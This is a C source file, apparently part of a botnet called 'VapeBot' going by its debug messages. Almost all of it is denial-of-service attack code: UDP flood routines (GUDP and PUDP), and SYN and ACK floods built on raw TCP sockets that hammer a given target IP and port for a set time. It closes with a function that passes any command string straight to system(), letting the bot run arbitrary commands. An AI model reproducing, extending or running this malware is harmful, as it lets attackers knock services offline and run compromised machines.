#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <linux/tcp.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

void attack_gudp_flood(char *target, int port, int timer)
{
    int fd, data_len = 1360;
    struct sockaddr_in addr, bind_addr;

    #ifdef DEBUG
    printf("[VapeBot/Flood] GUDP Attacking: %s:%d, Time: %d\n", target, port, timer);
    #endif

    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = htons(rand() % 0xffff);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target);

    char *data = malloc(data_len * sizeof(char));
    if (data == NULL)
        return;

    fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    bind(fd, (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));
    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

    for (int i = 0; i < data_len; i++)
        data[i] = (char)rand() % 0xffff;

    int end = time(NULL) + timer;
    while (end > time(NULL)) {
        send(fd, data, data_len, MSG_NOSIGNAL);
    }

    free(data);
}

void attack_pudp_flood(char *target, int port, int timer)
{
    int fd, data_len = 1;
    struct sockaddr_in addr, bind_addr;

    #ifdef DEBUG
    printf("[VapeBot/Flood] PUDP Attacking: %s:%d, Time: %d\n", target, port, timer);
    #endif

    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = htons(rand() % 0xffff);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target);

    char *data = malloc(data_len * sizeof(char));
    if (data == NULL)
        return;

    fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    bind(fd, (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));
    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

    for (int i = 0; i < data_len; i++)
        data[i] = (char)rand() % 0xffff;

    int end = time(NULL) + timer;
    while (end > time(NULL)) {
        send(fd, data, data_len, MSG_NOSIGNAL);
    }

    free(data);
}


void attack_syn_flood(char *target, int port, int timer)
{
	int fd, i, rfd;
	char *data, packet[4096];

	data = calloc(65535, sizeof(char));

	#ifdef DEBUG
	printf("[VapeBot/Flood] SYN Attacking: %s:%d, Time: %d\n",
	target, port, timer);
	#endif

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = inet_addr(target);

	fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

	int end = time(NULL) + timer;
	while(end > time(NULL))
	{
		struct tcphdr *tcp = (struct tcphdr *)(packet);
        tcp->source = htons(rand() % 0xffff);
        tcp->dest = htons(port);
        tcp->seq = rand();
        tcp->ack_seq = 0;
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->ack = 0;
        tcp->fin = 0;
        tcp->psh = 0;
        tcp->urg = 0;
        tcp->window = htons(65535);

		sendto(fd, packet, sizeof(struct tcphdr), MSG_NOSIGNAL,
            (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
	}
}

void attack_ack_flood(char *target, int port, int timer)
{
	int fd, i, rfd;
	char *data, packet[4096];

	data = calloc(65535, sizeof(char));

	#ifdef DEBUG
	printf("[VapeBot/Flood] ACK Attacking: %s:%d, Time: %d\n",
	target, port, timer);
	#endif

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = inet_addr(target);

	fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

	int end = time(NULL) + timer;
	while(end > time(NULL))
	{
		struct tcphdr *tcp = (struct tcphdr *)(packet);
        tcp->source = htons(rand() % 0xffff);
        tcp->dest = htons(port);
        tcp->seq = rand();
        tcp->ack_seq = rand();
        tcp->doff = 5;
        tcp->syn = 0;
        tcp->ack = 1;
        tcp->fin = 0;
        tcp->psh = 0;
        tcp->urg = 0;
        tcp->window = htons(65535);

		sendto(fd, packet, sizeof(struct tcphdr), MSG_NOSIGNAL,
            (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
	}
}

void send_command_to_bot(char *command)
{
	system(command);
}
